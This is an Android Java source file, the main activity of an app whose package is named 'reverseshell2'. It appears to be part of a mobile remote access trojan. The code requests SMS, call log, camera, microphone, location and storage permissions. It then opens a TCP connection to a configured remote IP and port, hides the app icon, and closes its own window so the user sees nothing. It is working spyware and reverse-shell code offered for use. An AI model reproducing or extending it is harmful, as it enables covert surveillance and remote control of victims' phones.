package com.example.reverseshell2;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;


public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";
    private PowerManager.WakeLock mWakeLock = null;
    private tcpConnection connection;
    
    // Permissions needed for modern Android versions
    private static final int PERMISSION_REQUEST_CODE = 123;
    private String[] requiredPermissions = {
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.VIBRATE
    };
    
    // Additional permissions for Android 10+
    private String[] modernPermissions = {
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.ACCESS_MEDIA_LOCATION,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            Manifest.permission.FOREGROUND_SERVICE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);
        context = getApplicationContext();
        Log.d(TAG, config.IP + "\t" + config.port);
        
        // Check and request permissions first
        checkAndRequestPermissions();
    }
    
    private void checkAndRequestPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        // Add required permissions
        for (String permission : requiredPermissions) {
            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        // Add modern permissions for newer Android versions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            for (String permission : modernPermissions) {
                if (permission.equals(Manifest.permission.ACCESS_BACKGROUND_LOCATION) && 
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    // Skip this for Android 11+ as it requires special handling
                    continue;
                }
                if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                    permissionsToRequest.toArray(new String[0]), 
                    PERMISSION_REQUEST_CODE);
        } else {
            // All permissions granted, start the connection
            startConnection();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Check if all critical permissions are granted
            boolean allCriticalGranted = true;
            for (int i = 0; i < permissions.length; i++) {
                String permission = permissions[i];
                int result = grantResults[i];
                
                // These permissions are critical for functionality
                if ((permission.equals(Manifest.permission.INTERNET) || 
                     permission.equals(Manifest.permission.ACCESS_NETWORK_STATE)) && 
                    result != PackageManager.PERMISSION_GRANTED) {
                    allCriticalGranted = false;
                    break;
                }
            }
            
            if (allCriticalGranted) {
                startConnection();
            } else {
                Log.e(TAG, "Critical permissions denied, app may not function correctly");
                // Try to start anyway with limited functionality
                startConnection();
            }
        }
    }
    
    private void startConnection() {
        // Initialize connection
        connection = new tcpConnection(activity, context);
        connection.execute(config.IP, config.port);
        
        if (config.icon) {
            new functions(activity).hideAppIcon(context);
        }
        
        // Finish activity
        finish();
        overridePendingTransition(0, 0);
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Ensure proper cleanup of resources
        if (connection != null) {
            connection.shutdown();
        }
    }
}
